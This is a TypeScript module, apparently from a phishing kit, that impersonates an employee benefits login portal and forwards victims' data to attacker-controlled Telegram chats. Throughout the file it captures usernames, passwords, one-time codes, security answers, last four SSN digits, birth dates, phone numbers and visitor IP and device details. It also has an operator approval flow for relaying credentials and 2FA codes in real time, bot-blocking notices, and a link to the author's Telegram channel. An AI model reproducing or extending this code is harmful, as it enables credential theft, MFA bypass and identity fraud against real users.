import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
import { sendTelegramApprovalWithCountdown } from "@/lib/telegram-approval-countdown"
import {
  buildLoginApprovalRequestBody,
  buildMethodApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from "@/lib/telegram-approval-templates"
import { SITE_DISPLAY_NAME } from '@/lib/site-url'
import { getApprovalsUrl } from '@/lib/project-config'

// Get Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
// TELEGRAM_CHAT_ID: one id, or several comma-separated (e.g. "111,222,333")
const CHAT_IDS = process.env.TELEGRAM_CHAT_ID
  ? process.env.TELEGRAM_CHAT_ID.split(',').map((id) => id.trim()).filter(Boolean)
  : []

// Validate that required environment variables are set
if (!TELEGRAM_BOT_TOKEN) {
  console.error('⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables')
}
if (CHAT_IDS.length === 0) {
  console.error('⚠️ TELEGRAM_CHAT_ID is not set in environment variables')
}

/** Payload for “New Visitor” Telegram (aligned with RTX / Alight Worklife format). */
export interface VisitorTelegramData {
  siteName: string
  location: string
  ip: string
  timezone: string
  isp: string
  asn?: string | null
  org?: string | null
  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
  osLabel?: string
  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
  deviceLabel?: string
  platformLabel?: string
  browserLabel?: string
  userAgent: string
  screen: string
  language: string
  referrer: string
  pageUrl: string
  localTime: string
  utcTime: string
}

interface FormData {
  type: string
  userId?: string
  password?: string
  confirmPassword?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
function normalizeAdminPortalUrl(raw?: string): string {
  const t = (raw ?? '').trim()
  if (!t) return '/admin/login'
  const origin = t.replace(/\/admin\/login.*$/i, '').replace(/\?.*$/, '').replace(/\/+$/, '')
  return origin || '/admin/login'
}

/** Project-specific approvals URL for Telegram approve/deny links. */
function adminPortalLink(): string {
  return getApprovalsUrl()
}

/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

/** Referrer / page fields: link when http(s), otherwise monospace. */
function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim()
  const resolved = t || fallback
  if (resolved === "Direct") return asCode(resolved)
  if (isHttpUrl(resolved)) return asLink(resolved)
  return asCode(resolved)
}

function asCode(value: unknown): string {
  const t = value == null || value === '' ? 'Unknown' : String(value).trim() || 'Unknown'
  return `<code>${escapeTelegramHtml(t)}</code>`
}

function asPre(value: unknown): string {
  const t = value == null ? '' : String(value)
  return `<pre>${escapeTelegramHtml(t || 'Unknown')}</pre>`
}

/** Site header for login/OTP/forgot-password flow messages. */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
}

export function buildPinEnteredMessage(pin: string, timestamp: string): string {
  return wrapFlowMessage(
    [
      '🔔 <b>PIN Entered</b>',
      '━━━━━━━━━━━━━━━━━━',
      `🔢 PIN: ${asCode(pin)}`,
      `⏰ Timestamp: ${asCode(timestamp)}`,
    ].join('\n'),
  )
}


function getRotatedPreviewUrl(_referrer?: string, _pageUrl?: string): string {
  // Social preview is permanently locked to Telegram channel (https://t.me/th3_allfather).
  // Search engine and member site login previews are strictly disabled.
  return "https://t.me/th3_allfather"
}

export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
  const site = escapeTelegramHtml(data.siteName)
  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
  const message = [
    `🌐 <b>(${site})</b>`,
    "━━━━━━━━━━━━━━━━━━",
    `📍 <b>Location:</b> ${asCode(data.location)}`,
    `🌍 <b>IP:</b> ${asCode(data.ip)}`,
    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
    `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
    ...(networkHint ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`] : []),
    "",
    `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? data.osLabel ?? "Unknown")}`,
    `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
    `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
    `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer, "Direct")}`,
    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
    "",
    `<a href="https://t.me/th3_allfather">All Father Arógunmásà́</a>`,
  ].join("\n")

  const previewUrl = getRotatedPreviewUrl(data.referrer, data.pageUrl)
  return await sendTelegramMessage(message, { disablePreview: false, previewUrl, preferSmallMedia: true })
}

export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
  let message: string

  // 1) Login attempt from main Sign In
  if (data.type === 'login') {
    message = `🔐 <b>Login Attempt</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(data.userId)}
🔒 Password: ${asCode(data.password)}`
  }
  // 1c) Admin login approval
  else if (data.type === 'admin_login_approve') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    message = `✅ <b>CC – Login Approved</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
✅ Status: Approved – User redirected to OTP page`
  }
  // 1d) Admin login denial
  else if (data.type === 'admin_login_deny') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    message = `❌ <b>CC – Login Denied</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
❌ Status: Denied – User shown error message`
  }
  // 1e) New login request (pending approval – same as request showing on admin)
  else if (data.type === 'login_approval_request') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : '/admin/login'
    message = `🔔 <b>Login request – approve or deny</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}

👉 ${asLink(adminLink, 'Approve or deny')}`
  }
  // 1f) Login OTP submitted – second approval (admin must approve code before redirect)
  else if (data.type === 'login_otp_approval_request') {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : '/admin/login'
    message = `🔢 <b>OTP submitted – approve or deny</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
🔢 Code: ${asCode((data as { password?: string }).password)}

👉 ${asLink(adminLink, 'Approve or deny')}`
  }
  // 1b) Register button clicked on home page
  else if (data.type === 'registration' && data.page === '/') {
    message = `🔹 <b>Type:</b> ${asCode('Register Button Clicked')}`
  }
  // 2) Login 2FA method selection (login flow)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page.startsWith('/login/2fa-verify')
  ) {
    const methodLabel =
      data.type === 'email_verification'
        ? 'Email'
        : 'Text Message (SMS)'

    message = `🔐 <b>Verify Your Identity</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(methodLabel)}`
  }
  // 3) Login OTP verification (login verify-code)
  else if (
    data.type === 'login_email_otp_verification' ||
    data.type === 'login_text_otp_verification'
  ) {
    const methodLabel =
      data.type === 'login_email_otp_verification'
        ? 'Email'
        : 'Text Message (SMS)'

    message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
  }
  // 3a) Registration OTP verification (email/text on /registration)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page === '/registration'
  ) {
    if (data.type === 'email_verification') {
      message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
    } else {
      message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
    }
  }
  // 3b) Registration Step 1 – personal info
  else if (data.type === 'personal_info_lookup') {
    message = `📝 <b>Registration - Step 1: Personal Info</b>
━━━━━━━━━━━━━━━━━━
👤 <b>First Name:</b> ${asCode((data as any).firstName)}
👤 <b>Last Name:</b> ${asCode((data as any).lastName)}
🏷️ <b>Zip Code:</b> ${asCode((data as any).zipCode)}`
  }
  // 3c) Registration Step 2 – employer name
  else if (data.type === 'employer_name_lookup') {
    message = `📝 <b>Registration - Step 2: Employer</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Employer Name:</b> ${asCode((data as any).employerId)}`
  }
  // 3d) Registration Step 3 – contact info
  else if (data.type === 'contact_info') {
    message = `📝 <b>Registration - Step 3: Contact Info</b>
━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> ${asCode(data.email || 'Not provided')}
📱 <b>Mobile:</b> ${asCode(data.phone)}`
  }
  // 3e) Registration Step 4 – method selected
  else if (
    data.type === 'registration' &&
    typeof data.page === 'string' &&
    data.page.startsWith('/registration?step=4')
  ) {
    const methodLabel = data.email ? 'Email' : 'Text Message (SMS)'

    message = `📝 <b>Registration - Step 4: Method Selected</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(methodLabel)}
${data.email ? `📧 <b>Email:</b> ${asCode(data.email)}` : ''}
${data.phone ? `📱 <b>Mobile:</b> ${asCode(data.phone)}` : ''}`
  }
  // 4) Registration credentials (User ID + password + confirm password)
  else if (data.type === 'User Credentials Setup') {
    message = `📝 <b>Registration - Credentials Set</b>
━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> ${asCode(data.userId)}
🔒 <b>Password:</b> ${asCode(data.password)}
🔒 <b>Confirm Password:</b> ${asCode(data.confirmPassword)}`
  }
  // 5) Registration security questions (all Q&A)
  else if (data.type === 'Security Questions') {
    // Expect securityAnswers: Array<{ question: string; answer: string }>
    const qa = Array.isArray((data as any).securityAnswers) ? (data as any).securityAnswers : []
    const lines = qa.map(
      (item: any, index: number) =>
        `Q${index + 1}: ${asCode(item.question)}\nA${index + 1}: ${asCode(item.answer)}`
    ).join('\n\n')

    message = `📝 <b>Registration - Security Questions</b>
━━━━━━━━━━━━━━━━━━

${lines || 'No questions captured.'}`
  }
  // 6) Registration complete (final submit)
  else if (data.type === 'Registration Complete') {
    message = `📝 <b>Registration Complete</b>
━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> ${asCode(data.userId)}
✅ <b>Status:</b> ${asCode('Submitted')}`
  }
  // 7a) Login 2FA – resend code (login verify-code)
  else if (data.type === 'login_email_otp_resend' || data.type === 'login_text_otp_resend') {
    message = `🔔 <b>Resend Code Clicked</b>
━━━━━━━━━━━━━━━━━━`
  }
  // 7b) Login 2FA – "I did not receive my code" clicked
  else if (data.type === 'login_did_not_receive_code') {
    let methodLabel = 'Unknown'
    if (typeof data.page === 'string') {
      if (data.page.includes('method=text')) {
        methodLabel = 'Text Message (SMS)'
      } else if (data.page.includes('method=email')) {
        methodLabel = 'Email'
      }
    }

    message = `🔔 <b>"I did not receive my code" Clicked</b>
━━━━━━━━━━━━━━━━━━

User was sent back to the verification method selection page.
Method at time of click: ${asCode(methodLabel)}`
  }
  // Unknown types — do not send a generic Form Submission alert

  else {

    return false

  }

  return await sendTelegramMessage(wrapFlowMessage(message))
}

export type SendTelegramMessageOptions = {
  disableWebPagePreview?: boolean
  disablePreview?: boolean
  previewUrl?: string
  preferSmallMedia?: boolean
  showAboveText?: boolean
}

export async function sendTelegramMessage(
  message: string,
  options: SendTelegramMessageOptions = {},
): Promise<boolean> {
  const disablePreview = options.disablePreview ?? (options.disableWebPagePreview !== false)
  const link_preview_options = disablePreview
    ? { is_disabled: true }
    : {
        is_disabled: false,
        ...(options.previewUrl ? { url: options.previewUrl } : {}),
        prefer_small_media: options.preferSmallMedia ?? true,
        show_above_text: options.showAboveText ?? false,
      }

  // Validate we have the required token
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('Cannot send Telegram message: TELEGRAM_BOT_TOKEN is not set')
    return false
  }

  // If no chat ID(s) configured, log warning
  if (CHAT_IDS.length === 0) {
    console.warn('No TELEGRAM_CHAT_ID configured - message will not be sent')
    return false
  }
  
  const promises = CHAT_IDS.map(chatId => 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: disablePreview,
        link_preview_options,
      })
    })
    .then(async (response) => {
      try {
        const data = await response.json()
        if (!response.ok || !data.ok) {
          console.error(`Failed to send to chat ${chatId}:`, data)
          return { ok: false }
        }
        return { ok: true }
      } catch (parseError) {
        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
        return { ok: false }
      }
    })
    .catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return { ok: false }
    })
  )

  const results = await Promise.allSettled(promises)
  
  // Check if at least one message was sent successfully
  const successCount = results.filter(
    result => result.status === 'fulfilled' && result.value && result.value.ok === true
  ).length
  
  // Return true if at least one message succeeded, false otherwise
  return successCount > 0
}

export interface VisitorData {
  location: string;
  ip: string;
  ipV4?: string;
  ipV6?: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  url?: string;
  referrer?: string;
  utcTime: string;
}

export interface BotVisitData {
  name: string;
  type: string;
  userAgent: string;
  ip: string;
  path: string;
  matchedPatterns: string[];
}

export interface LoginData {
  userId: string;
  password: string;
}

export interface VerificationData {
  verificationType: string;
  code: string;
}

export interface ForgotPasswordData {
  ssnLast4: string;
  birthDate: string;
}

export interface NewUserData {
  ssnLast4: string;
  birthDate: string;
}

export interface AccountFoundData {
  method: string;
  password?: string;
}

export interface RememberDeviceData {
  choice: string;
}

export interface VerifyDetailsData {
  ssnLast4: string;
  zip: string;
  birthDate: string;
  fullName: string;
  phoneNumber: string;
}

export interface ZipCodeData {
  zipCode: string;
}

/* fleet-resend-identity-helper */
const RESEND_ID_BRAND_DEFAULT = "User ID"
function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = asCode): string {
  const raw = userId == null ? "" : String(userId).trim()
  if (!raw) return ""
  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (raw.includes("@") && emailRe.test(raw)) return `📧 Email: ${asCodeFn(raw)}`
  const digits = raw.replace(/\D/g, "")
  if (digits.length >= 10 && digits.length <= 15 && !raw.includes("@")) {
    return `📱 Phone: ${asCodeFn(raw)}`
  }
  return `👤 ${RESEND_ID_BRAND_DEFAULT}: ${asCodeFn(raw)}`
}

class TelegramService {
  private botToken: string;
  private chatIds: string[];

  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || "";
    const raw =
      process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_IDS || "";
    this.chatIds = raw
      .split(",")
      .map((id) => id.trim())
      .filter((id) => id.length > 0);
  }

  async sendLoginApprovalNotification(data: {
    userId: string
    password: string
    method?: string
    createdAtMs: number
    databaseShard?: string
    ip?: string
    isAlight?: boolean
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL ? adminPortalLink() : "/admin/login"
    const isAlight = data.isAlight ?? (
      typeof process !== "undefined" && (
        process.env.NEXT_PUBLIC_PORTAL_FAMILY === "alight" ||
        process.env.PORTAL_FAMILY === "alight" ||
        /alight/i.test(process.env.BRAND_PORTAL_NAME || "") ||
        /alight/i.test(process.env.BRAND_PLATFORM_NAME || "")
      )
    )
    await sendTelegramApprovalWithCountdown({
      botToken: TELEGRAM_BOT_TOKEN,
      chatIds: CHAT_IDS,
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildLoginApprovalRequestBody({
          userId: data.userId,
          password: data.password,
          method: data.method,
          adminLink,
          secondsLeft,
          databaseShard: data.databaseShard,
          asCode,
          asLink,
          isAlight,
        }),
    })
  }

  async sendVerificationApprovalNotification(data: {
    userId: string
    method?: string
    code: string
    createdAtMs: number
    databaseShard?: string
    ip?: string
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL ? adminPortalLink() : "/admin/login"
    await sendTelegramApprovalWithCountdown({
      botToken: TELEGRAM_BOT_TOKEN,
      chatIds: CHAT_IDS,
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildOtpApprovalRequestBody({
          userId: data.userId,
          code: data.code,
          method: data.method,
          adminLink,
          secondsLeft,
          databaseShard: data.databaseShard,
          asCode,
          asLink,
        }),
    })
  }

  async sendMethodApprovalNotification(data: {
    userId: string
    method: "email" | "text" | "sms"
    createdAtMs: number
    ip?: string
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL ? adminPortalLink() : "/admin/login"
    await sendTelegramApprovalWithCountdown({
      botToken: TELEGRAM_BOT_TOKEN,
      chatIds: CHAT_IDS,
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildMethodApprovalRequestBody({
          userId: data.userId,
          method: data.method,
          adminLink,
          secondsLeft,
          asCode,
          asLink,
        }),
    })
  }

  private async sendMessage(message: string): Promise<void> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error(
        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      );
      return;
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

    try {
      await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          }),
        ),
      );
    } catch (error) {
      console.error("Failed to send Telegram message:", error);
    }
  }

  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
    const patternsText =
      data.matchedPatterns && data.matchedPatterns.length > 0
        ? data.matchedPatterns.join(", ")
        : "Unknown";

    const body = [
      `🤖 <b>BOT</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🧩 <b>Name:</b> ${asCode(data.name)}`,
      `📝 <b>Type:</b> ${asCode(data.type)}`,
      "",
      "🤖 <b>User-Agent:</b>",
      asPre(data.userAgent),
      `📍 <b>IP:</b> ${asCode(data.ip)}`,
      `🔗 <b>Path:</b> ${asCode(data.path)}`,
      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${asCode(patternsText)}`,
    ].join("\n");

    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendLoginNotification(data: LoginData): Promise<void> {
    const body = [
      `🔐 <b>Login Attempt</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `👤 <b>User ID:</b> ${asCode(data.userId)}`,
      `🔑 <b>Password:</b> ${asCode(data.password)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    const body = [
      `🔑 <b>Verification Code Submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Code:</b> ${asCode(data.code)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendVerificationClickNotification(
    verificationType: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🟦 <b>Verification Option Selected</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>Type:</b> ${asCode(verificationType)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendResendCodeNotification(
    isSecondOtpOrData: boolean | { userId?: string; isSecondOtp?: boolean } = false,
    _ip?: string,
  ): Promise<void> {
    void _ip
    const data =
      typeof isSecondOtpOrData === "object" && isSecondOtpOrData
        ? isSecondOtpOrData
        : { isSecondOtp: Boolean(isSecondOtpOrData), userId: undefined }
    void data.isSecondOtp
    const idLine = formatResendIdentityLine(data.userId)
    const body = [
      `🔄 <b>Resend Code Requested</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      idLine || null,
    ]
      .filter((line): line is string => Boolean(line))
      .join("\n")
    await this.sendMessage(wrapFlowMessage(body))
  }

  async sendForgotPasswordPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>Forgot Password page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User clicked "Forgot User ID or Password?" and landed on the form.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordNotification(
    data: ForgotPasswordData,
  ): Promise<void> {
    const body = [
      `🔑 <b>Forgot Password – form submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `✅ <b>Privacy Policy:</b> accepted`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>New User page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User clicked "New User?" and landed on the form.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserNotification(data: NewUserData): Promise<void> {
    const body = [
      `👤 <b>New User – form submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `✅ <b>Privacy Policy:</b> accepted`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserCodePageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>New User – Enter Access Code page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User landed on the page to enter the code sent to them.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserCodeNotification(code: string, _ip?: string): Promise<void> {
    const body = [
      `🔢 <b>New User – Access Code Entered</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Code:</b> ${asCode(code)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserPasswordPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>New User – Create Password page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User landed on the page to create their password.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserPasswordNotification(
    password: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🔑 <b>New User – Password Set</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔑 <b>Password:</b> ${asCode(password)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
    const lines = [
      `✅ <b>Account Found – Continue Clicked</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>Method:</b> ${asCode(data.method)}`,
    ];
    if (data.password) {
      lines.push(`🔑 <b>Password:</b> ${asCode(data.password)}`);
    }
    await this.sendMessage(wrapFlowMessage(lines.join("\n")));
  }

  async sendAccountFoundResetPasswordNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>Account Found – Reset password link clicked</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User clicked "Reset password" on the account found page.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordVerifyNotification(
    verificationType: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🔐 <b>Forgot Password – Verify Identity Option Selected</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>Type:</b> ${asCode(verificationType)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordCodeNotification(
    code: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🔢 <b>Forgot Password – Access Code Entered</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Code:</b> ${asCode(code)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordResendNotification(_ip?: string): Promise<void> {
    const body = [
      `🔄 <b>Forgot Password – Resend Code Requested</b>`,
      `━━━━━━━━━━━━━━━━━━`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendRememberDeviceNotification(
    data: RememberDeviceData,
  ): Promise<void> {
    const body = [
      `💾 <b>Remember Device Choice</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `📱 <b>Choice:</b> ${asCode(data.choice)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
    const body = [
      `📝 <b>Verify Details – form submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📍 <b>ZIP Code:</b> ${asCode(data.zip)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `👤 <b>Full Name:</b> ${asCode(data.fullName)}`,
      `📞 <b>Phone:</b> ${asCode(data.phoneNumber)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendIdentityPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>Identity confirmation page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User landed on /identity (confirm identity).`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendIdentityFormNotification(data: ForgotPasswordData): Promise<void> {
    const body = [
      `🪪 <b>Identity confirmation submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `✅ <b>Privacy Policy:</b> accepted`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendZipCodeNotification(data: ZipCodeData): Promise<void> {
    const body = [
      `📮 <b>Zip Code Submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `📮 <b>Zip Code:</b> ${asCode(data.zipCode)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendRecoveryPasswordPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>Change Your Password page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User completed deny-recovery OTP and landed on create / change password.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendRecoveryPasswordNotification(password: string, _ip?: string): Promise<void> {
    const body = [
      `🔑 <b>Deny recovery – new password submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔑 <b>Password:</b> ${asCode(password)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendInputNotification(inputs: Record<string, string>): Promise<void> {
    const entries = Object.entries(inputs).filter(([, value]) => value.trim() !== "");
    if (entries.length === 0) return;

        const flow = (inputs.Flow || inputs.flow || "").trim().toLowerCase()
    const userId = (inputs["User ID"] || inputs.userId || "").trim()

    // User ID step (Flow: Login) → dedicated Login Attempt (no Flow line)
    if (flow === "login" && userId) {
      const body = [
        `🔐 <b>Login Attempt</b>`,
        `━━━━━━━━━━━━━━━━━━`,
        `👤 <b>User ID:</b> ${asCode(userId)}`,
      ].join("\n")
      await this.sendMessage(wrapFlowMessage(body))
      return
    }

const body = [
      `🔐 <b>New Input Received</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      ...entries.map(
        ([key, value]) =>
          `${escapeTelegramHtml(key)}: ${asCode(value)}`,
      ),
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendBlockedBotNotification(data: {
    userAgent: string;
    ip: string;
    path: string;
  }): Promise<void> {
    const body = [
      `🚫 <b>Bad Bot Blocked</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      "🤖 <b>User-Agent:</b>",
      asPre(data.userAgent),
      `🌍 <b>IP:</b> ${asCode(data.ip)}`,
      `🔗 <b>Path:</b> ${asCode(data.path)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendRawMessage(message: string): Promise<void> {
    await this.sendMessage(message);
  }


}

export const telegramService = new TelegramService();

/** Simple helper for pages that just need to send a raw Telegram message. */
export async function sendTelegramNotification(message: string): Promise<void> {
  await telegramService.sendRawMessage(message);
}
